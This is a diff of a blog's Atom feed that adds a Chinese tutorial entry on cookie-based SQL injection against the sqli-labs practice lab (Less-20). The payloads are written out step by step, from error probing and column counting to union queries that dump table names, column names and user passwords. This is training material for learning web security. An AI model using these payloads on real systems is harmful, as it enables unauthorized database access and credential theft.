@@ -3,12 +3,57 @@
     <id>https://kiyomijin.github.io</id>
     <title>My Violet Eva Garden • Posts by &#34;sql注入探究&#34; category</title>
     <link href="https://kiyomijin.github.io" />
-    <updated>2022-10-01T12:10:06.000Z</updated>
-    <category term="原创" />
+    <updated>2022-10-01T14:13:13.000Z</updated>
     <category term="SQL注入探究" />
+    <category term="原创" />
     <category term="数据库安全" />
     <category term="CTF小训" />
     <category term="Misc" />
+    <entry>
+        <id>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/</id>
+        <title>Cookie注入</title>
+        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;h1 id=&#34;sql注入之cookie注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入之cookie注入&#34;&gt;#&lt;/a&gt; SQL 注入之 Cookie 注入&lt;/h1&gt;
+&lt;p&gt;本篇讲解 Cookie 注入。&lt;/p&gt;
+&lt;p&gt;老样子，Less-20，直接送入 repeater&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001224019603.png&#34; alt=&#34;image-20221001224019603&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试报错&#34;&gt;#&lt;/a&gt; 尝试报错&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001224212276.png&#34; alt=&#34;image-20221001224212276&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试不报错&#34;&gt;#&lt;/a&gt; 尝试不报错&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001224125843.png&#34; alt=&#34;image-20221001224125843&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;尝试order-by-注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试order-by-注入&#34;&gt;#&lt;/a&gt; 尝试 order by 注入&lt;/h2&gt;
+&lt;p&gt;order by n asc/desc 是指定列号 n 进行排序&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错：YOUR COOKIE : uname = admin&amp;#x27; order by 4 # and expires&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;成功不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;因此确定 &lt;code&gt;列数为3&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：在 order by 后面的不会根据计算的结果来排序，所以可以直接用来报错注入。&lt;/p&gt;
+&lt;p&gt;尝试下直接报错注入是否可行：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错：YOUR COOKIE : uname = admin&amp;#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;报错，看来这种直接报错注入的方式是不可行的。&lt;/p&gt;
+&lt;h2 id=&#34;cookie注入查询到数据库名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cookie注入查询到数据库名&#34;&gt;#&lt;/a&gt; Cookie 注入查询到数据库名&lt;/h2&gt;
+&lt;p&gt;cookie 注入就是基于 union 查询的基础上，在 Cookie 中进行注入&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, database(), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001225129636.png&#34; alt=&#34;image-20221001225129636&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;查询到表名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询到表名&#34;&gt;#&lt;/a&gt; 查询到表名&lt;/h2&gt;
+&lt;p&gt;进而通过替换 database () 处，变成 &lt;code&gt;双注入&lt;/code&gt; ，再查询出表名&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001225840363.png&#34; alt=&#34;image-20221001225840363&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;查询到列名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询到列名&#34;&gt;#&lt;/a&gt; 查询到列名&lt;/h2&gt;
+&lt;p&gt;一样的套路&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#x27;users&amp;#x27;), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001230122246.png&#34; alt=&#34;image-20221001230122246&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;查询到账号密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询到账号密码&#34;&gt;#&lt;/a&gt; 查询到账号密码&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(concat_ws(0x7e,username,password)) from security.users), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001230318424.png&#34; alt=&#34;image-20221001230318424&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;思考&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#思考&#34;&gt;#&lt;/a&gt; 思考&lt;/h2&gt;
+&lt;p&gt;通过 Cookie 注入，我们要思考： &lt;code&gt;HTTP请求包中，是否还有其他的字段（Cookie外）也有可能和数据库产生交互呢？&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;答：有的， &lt;code&gt;HTTP-Referer&lt;/code&gt;  就存在。&lt;/p&gt;
+&lt;p&gt;至此，Cookie 注入演示完毕。&lt;/p&gt;
+</content>
+        <category term="SQL注入探究" />
+        <updated>2022-10-01T14:13:13.000Z</updated>
+    </entry>
     <entry>
         <id>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</id>
         <title>时间盲注</title>
